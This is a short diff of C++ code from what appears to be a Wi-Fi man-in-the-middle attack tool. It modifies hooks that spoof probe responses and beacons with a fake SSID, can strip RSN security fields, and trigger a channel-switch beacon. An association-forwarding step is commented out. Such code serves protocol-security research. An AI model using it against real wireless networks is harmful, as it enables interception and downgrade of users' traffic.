@@ -53,20 +53,22 @@ Dot11ProbeResponse make_confused_probe_resp(const Dot11ProbeResponse &real, cons
 	return resp;
 }
 
-
+// change probe responses SSID
 void SsidConfusionHooks::on_probe_response(Dot11ProbeResponse &resp) {
 	resp = make_confused_probe_resp(resp, confused_ssid_, strip_rsn_);
 }
 
+// add periodic beacon on rogue with fake SSID
 bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
 	auto b = make_confused_beacon(*m.beacon, confused_ssid_, strip_rsn_);
 	m.send_to_rogue(b);
-	return true;
+	return false; // still send CSA cwitch beacon on real
 }
 
 bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11,
 										  HWAddress<6>) {
-	const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
+	return false;
+	/*const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
 	if (!assoc) return false;
 
 	auto out = make_real_ssid_assoc_req(*assoc, real_ssid_);
@@ -75,6 +77,6 @@ bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11,
 
 	m.send_to_real(out);
 	m.client_state.update_state(ClientState::Associated);
-	return true;
+	return true;*/
 }
 }
